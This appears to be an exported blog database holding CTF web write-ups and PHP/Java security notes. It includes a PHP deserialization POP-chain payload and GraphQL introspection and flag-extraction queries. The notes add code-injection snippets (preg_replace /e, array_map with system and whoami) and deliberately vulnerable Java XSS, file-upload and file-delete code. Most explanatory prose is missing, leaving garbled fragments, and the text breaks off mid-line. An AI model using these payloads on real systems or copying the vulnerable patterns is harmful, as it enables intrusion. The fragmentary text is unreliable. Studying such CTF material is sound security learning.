class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>eeeecmd**__isset**</p>\n<p>eeeeobjStart</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>($this-&gt;func)();<strong></strong>__invoke</strong></p>\n<p>StartfuncSec</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>pop</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//error_reporting(0);</span></span><br><span class=\"line\"><span class=\"comment\">//highlight_file(__FILE__);</span></span><br><span class=\"line\"><span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;func=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$var</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj=<span class=\"keyword\">new</span> <span class=\"title class_\">Easy</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">eeee</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Start</span>();</span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;obj=<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span>-&gt;<span class=\"keyword\">var</span>=<span class=\"variable\">$c</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;name=<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?pop=O:<span class=\"number\">4</span>:<span class=\"string\">&quot;eeee&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">5</span>:<span class=\"string\">&quot;Start&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;name&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;var&quot;</span>;r:<span class=\"number\">1</span>;&#125;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;func&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;var&quot;</span>;N;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-ezAPI\"><a href=\"#4-ezAPI\" class=\"headerlink\" title=\"4.ezAPI\"></a>4.ezAPI</h2><p><a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        &lt;center&gt;</span><br><span class=\"line\">            &lt;h1&gt;Search Page&lt;/h1&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;hr&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            ID: </span><br><span class=\"line\">            &lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt;</span><br><span class=\"line\">            &lt;/form&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$id = $_POST[&#x27;id&#x27;];</span><br><span class=\"line\">function waf($str)&#123;</span><br><span class=\"line\">    if(!is_numeric($str) || preg_replace(&quot;/[0-9]/&quot;,&quot;&quot;,$str) !== &quot;&quot;)&#123;#False,</span><br><span class=\"line\">        return False;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return True;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function send($data)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $options = array(</span><br><span class=\"line\">        &#x27;http&#x27; =&gt; array(</span><br><span class=\"line\">            &#x27;method&#x27; =&gt; &#x27;POST&#x27;,</span><br><span class=\"line\">            &#x27;header&#x27; =&gt; &#x27;Content-type: application/json&#x27;,</span><br><span class=\"line\">            &#x27;content&#x27; =&gt; $data,</span><br><span class=\"line\">            &#x27;timeout&#x27; =&gt; 10 * 60</span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br><span class=\"line\">    $context = stream_context_create($options);</span><br><span class=\"line\">    $result = file_get_contents(&quot;http://graphql:8080/v1/graphql&quot;, false, $context);</span><br><span class=\"line\">    return $result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($id))&#123;</span><br><span class=\"line\">    if(waf($id))&#123;</span><br><span class=\"line\">        isset($_POST[&#x27;data&#x27;]) ? $data=$_POST[&#x27;data&#x27;] : $data=&#x27;&#123;&quot;query&quot;:&quot;query&#123;\\nusers_user_by_pk(id:&#x27;.$id.&#x27;) &#123;\\nname\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;&#x27;;</span><br><span class=\"line\">        $res = json_decode(send($data));</span><br><span class=\"line\">        if($res-&gt;data-&gt;users_user_by_pk-&gt;name !== NULL)&#123;</span><br><span class=\"line\">            echo &quot;ID: &quot;.$id.&quot;&lt;br&gt;Name: &quot;.$res-&gt;data-&gt;users_user_by_pk-&gt;name;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&lt;b&gt;Can&#x27;t found it!&lt;/b&gt;&lt;br&gt;DEBUG: &quot;;</span><br><span class=\"line\">            var_dump($res-&gt;data);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;&lt;b&gt;Hacker!&lt;/b&gt;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    die(&quot;&lt;b&gt;No Data?&lt;/b&gt;&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/center&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>graphQL</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/wy_97/article/details/110522150\" >https://blog.csdn.net/wy_97/article/details/110522150<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>postdatagraphQLapi</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\\n  __schema &#123;\\n  types &#123;\\n name  \\n &#125;\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702655.png\"\n                        alt=\"-1665405825041\"\n                 ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;ffffllllaaagggg_1n_h3r3_flag &#123;flag&#125;&#125;&quot;,&quot;variables&quot;:null&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;</span><br></pre></td></tr></table></figure>"},{"title":"PHP / JAVA","date":"2022-11-03T15:51:24.000Z","excerpt":"PHP / JAVA","_content":"\n# PHP / JAVA\n\n## PHP\n\n### 1.php \n\n- `system()` OS\n- `passthru()`OS\n- `exec()`OS\n- `shell_exec` OS\n- `popen()/proc_open()`OS**<u>fread</u>**\n- ` ` [``]OS\n\n### 2.phpphp.ini\n\nphp\n\n- `file://`  file:// offallow_url_fopen off/on allow_url_includeoff/on\n\n- `php://filter` base64phpoff\n\n- `php://input` POSTallow_url_fopen off/on\n\n  allow_url_includeon\n\n- `zip:// compress.bzip:// compress.zlib://`off\n\n- `data://` PHPon\n\n- `phar:/`/  zipzipphar\n\n### 3.\n\n- `preg_replace()` php 5.6 /e  magic_quotes_gpc=Off php\n\n  ```\n  <?php\n  \tpreg_replace('/<php>(.*?)' . $_GET['reg'], '\\\\1' ,'<php>phpinfo()<php>');\n  \tpreg_replace('/anything/e', $_GET['test'], 'anything_test');\n  \tpreg_replace('/<php>(.*?)<\\/php>/e', '\\\\1', $_GET['test']);\n  ```\n\n- `array_map()` \n\n  ```\n  <?php\n      $func=$_GET['func'];\n      $cmd=$_POST['cmd'];\n      $array[0]=$cmd;\n      $new_array=array_map($func,$array);\n      echo $new_array;\n  ?>\n  //    http://localhost/123.php?func=system   cmd=whoami\n   //   http://localhost/123.php?func=assert   cmd\n  ```\n\n  \n\n- `assert()` \n\n  > assertPHP\n\n### 4.php /\n\n9\n\n```\nfile_get_contents   // *\nfread\nfgets\nfgetss\nfile\nparse_ini_file\nreadfile    // *\nhighlight_file  // *\nshow_source // *\n```\n\n\n\n```php\n<?php\n\n// file_get_contents\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'file_get_contents').PHP_EOL);\necho file_get_contents('flag.txt');\necho PHP_EOL;\n\n// fopen fread\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fread').PHP_EOL);\n$file = fopen(\"flag.txt\",\"rb\");\necho fread($file,1024);     //  resource \nfclose($file);\necho PHP_EOL;\n\n// fopen fgets\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fgets').PHP_EOL);\n$file = fopen(\"flag.txt\",\"r\");      \necho fgets($file, 4096);        //  HTML  PHP \nfclose($file);\necho PHP_EOL;\n\n// fopen fgetss\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fgetss').PHP_EOL);\n$file = fopen(\"flag.txt\",\"r\");     \necho fgetss($file, 4096);        //  HTML  PHP \nfclose($file);\necho PHP_EOL;\n\n// readfile\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'readfile').PHP_EOL);\necho readfile(\"flag.txt\");      // \necho PHP_EOL;\n\n// file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'file').PHP_EOL);\nprint_r(file('flag.txt'));      //  print_r  var_dump \necho PHP_EOL;\n\n// parse_ini_file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'parse_ini_file').PHP_EOL);\necho parse_ini_file(\"flag.txt\");        //  ini \necho PHP_EOL;\n\n// show_source\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'show_source').PHP_EOL);\nshow_source('flag.txt');\necho PHP_EOL;\n\n// highlight_file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'highlight_file').PHP_EOL);\nhighlight_file('flag.txt');\necho PHP_EOL;\n\n\n?>\n\n```\n\nPHP fweite() file_put_contents()\n\n```php\n<?php\n$file = fopen(\"test.txt\",\"w\");\necho fwrite($file,\"Hello World. Testing!\");\nfclose($file);\n?>\n\n<?php\necho file_put_contents(\"test.txt\",\"Hello World. Testing!\");\n?>\n```\n\n\n\n### 5.php \n\n- `include`\n\n  ```\n  <?php include 'test.php';?>\n  ```\n\n- `include_once`  \n\n- `require` include\n\n- `require_once`   require_once \n\n\n\n> 1includerequire2require_onceinclude_onceincluderequire\n\n\n\n### 6.php\n\n- `serialize()`  \n\n- `unserialize()` \n\n-  \n\n  ```\n  1.__construct()\n  \n  2.__destruct()\n  \n  3.__call()\n  \n  4.__callStatic()\n  \n  5.__get()\n  \n  6.__set()\n  \n  7.__isset()isset()empty()\n  \n  8.__unset()unset()\n  \n  9.__sleep()serialize()\n  \n  10.__wakeup()unserialize()\n  \n  11.__toString()\n  \n  12.__invoke()\n  \n  13.__set_state()var_export()\n  \n  14.__clone()\n  \n  15.__autoload()\n  \n  16.__debugInfo()\n  ```\n\n### 7.php \n\n- `$_GET`  $_GET  method=\"get\" \n\n   GET \n\n- `$POST` $_POST  method=\"post\" \n\n   POST \n\n- `$_REQUEST` $_GET$POST\n\n- `$_FILES` \n\n- `$_COOKIE` cookie \n\n- `$SESSION`Session\n\n## JAVA\n\n### 1.Web\n\njava EE web\n\n**tomcat   jetty  resin**\n\njava EE web \n\n**JBOSS   GlassFish   Weblogic   Webshpere**\n\n\n\n\n\nhttps://zhuanlan.zhihu.com/p/399939177\n\n### 2.tomcat\n\n- `bin`:bat\n- `conf`:Tomcat\n- `lib`:Tomcatjarjar\n- `temp`:Tomcat\n- `webapps`:jar\n- `work`worktomcatJSP \n\n\n\n### 3.tomcatweb.xml  tomcat_user.xml \n\n`web.xml`\nTomcatweb.xmlconfweb.xml.,Tomcatweb.xmlweb.xml(WEB-INF/web.xml).tomcatjspservlet,listjsp,404..\n\n`tomcat-users.xml`\n tomcat.tomcathttp://localhost:8080tomcat manager,xml\n\n\n\n### 4.jsp\n\n> JSPJava Server PagesJSPHTMLJava<%%>\n>\n> JSPJava servletJava webHTMLXHTMLXMLJSPJSP\n>\n> JSP\n>\n> JSPJavaBeans\n\n\n\n### 5.java xss\n\n```\nxss   (name) \n<%\nString name = request.getParameter(\"name\");\nout.println(name)\n%>\n xss  (msg) \npublic void Message(HttpServletRequest req, HttpServletResponse resp) {\n\tString message = req.getParameter(\"msg\");\ntry{\n\tresp.getWriter().print(message);\n} catch (IOException e) {\n\te. printStackTrace();\n}\nDOM xssJavaScript\n<script>\n    var pos = document.URL.indexOf(\"#\")+1;\n    var name = document.URL.substring(pos, document.URL.length);\n    document.write(name);\neval(\"var a = \" + name);\n</script>\nxss JDBC\n```\n\n\n\n### 6.Java \n\n```\nFiles.readAllBytesFiles.readAllLines\nFileInputStream\nFileOutputStream\nFile\nFileUtils\nIOUtils\nBufferedReader\nServletFileUpload\nMultipartFile\nCommonsMultipartFile\nPrintWriter\nZipInputStream\nZipEntry.getSize\n```\n\n\n\n### 7.\n\n```\nDiskFileItemFactory@MultipartConfigMultipartFileFile\nUpload\nInputStream\nOutputStream\nwrite\nfileName\nfilePath\n```\n\n\n\n### 8.servlet\n\n> servlet3\n> commons-fileuploadcommons-iojar\n>\n> servlet3\n> request.getParts()\n\n\n\n### 9.java\n\n```\nprivate boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n    Part part = request.getPart(\"fileName\");\n    if(part == null) {\n      return false;\n    }\n    String filename = UPLOAD_PATH + File.separator + part.getSubmittedFileName();\n    part.write(filename);\n    part.delete();\n    return true;\n}\n```\n\n\n\n### 10.\n\n```\nString filename = request.getParameter(\"filename\");\nFile file = new File(filename);\nif(file != null && file.exists() && file.delete()) {\n  \tresponse.getWriter().println(\"delete success\");\n} else {\n  \tresponse.getWriter().println(\"delete failed\");\n}\n```","source":"_posts/PHP  JAVA.md","raw":"---\ntitle: PHP / JAVA\ndate: 2022-11-03 23:51:24\nexcerpt: PHP / JAVA\ncategories: \n---\n\n# PHP / JAVA\n\n## PHP\n\n### 1.php \n\n- `system()` OS\n- `passthru()`OS\n- `exec()`OS\n- `shell_exec` OS\n- `popen()/proc_open()`OS**<u>fread</u>**\n- ` ` [``]OS\n\n### 2.phpphp.ini\n\nphp\n\n- `file://`  file:// offallow_url_fopen off/on allow_url_includeoff/on\n\n- `php://filter` base64phpoff\n\n- `php://input` POSTallow_url_fopen off/on\n\n  allow_url_includeon\n\n- `zip:// compress.bzip:// compress.zlib://`off\n\n- `data://` PHPon\n\n- `phar:/`/  zipzipphar\n\n### 3.\n\n- `preg_replace()` php 5.6 /e  magic_quotes_gpc=Off php\n\n  ```\n  <?php\n  \tpreg_replace('/<php>(.*?)' . $_GET['reg'], '\\\\1' ,'<php>phpinfo()<php>');\n  \tpreg_replace('/anything/e', $_GET['test'], 'anything_test');\n  \tpreg_replace('/<php>(.*?)<\\/php>/e', '\\\\1', $_GET['test']);\n  ```\n\n- `array_map()` \n\n  ```\n  <?php\n      $func=$_GET['func'];\n      $cmd=$_POST['cmd'];\n      $array[0]=$cmd;\n      $new_array=array_map($func,$array);\n      echo $new_array;\n  ?>\n  //    http://localhost/123.php?func=system   cmd=whoami\n   //   http://localhost/123.php?func=assert   cmd\n  ```\n\n  \n\n- `assert()` \n\n  > assertPHP\n\n### 4.php /\n\n9\n\n```\nfile_get_contents   // *\nfread\nfgets\nfgetss\nfile\nparse_ini_file\nreadfile    // *\nhighlight_file  // *\nshow_source // *\n```\n\n\n\n```php\n<?php\n\n// file_get_contents\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'file_get_contents').PHP_EOL);\necho file_get_contents('flag.txt');\necho PHP_EOL;\n\n// fopen fread\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fread').PHP_EOL);\n$file = fopen(\"flag.txt\",\"rb\");\necho fread($file,1024);     //  resource \nfclose($file);\necho PHP_EOL;\n\n// fopen fgets\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fgets').PHP_EOL);\n$file = fopen(\"flag.txt\",\"r\");      \necho fgets($file, 4096);        //  HTML  PHP \nfclose($file);\necho PHP_EOL;\n\n// fopen fgetss\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fgetss').PHP_EOL);\n$file = fopen(\"flag.txt\",\"r\");     \necho fgetss($file, 4096);        //  HTML  PHP \nfclose($file);\necho PHP_EOL;\n\n// readfile\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'readfile').PHP_EOL);\necho readfile(\"flag.txt\");      // \necho PHP_EOL;\n\n// file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'file').PHP_EOL);\nprint_r(file('flag.txt'));      //  print_r  var_dump \necho PHP_EOL;\n\n// parse_ini_file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'parse_ini_file').PHP_EOL);\necho parse_ini_file(\"flag.txt\");        //  ini \necho PHP_EOL;\n\n// show_source\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'show_source').PHP_EOL);\nshow_source('flag.txt');\necho PHP_EOL;\n\n// highlight_file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 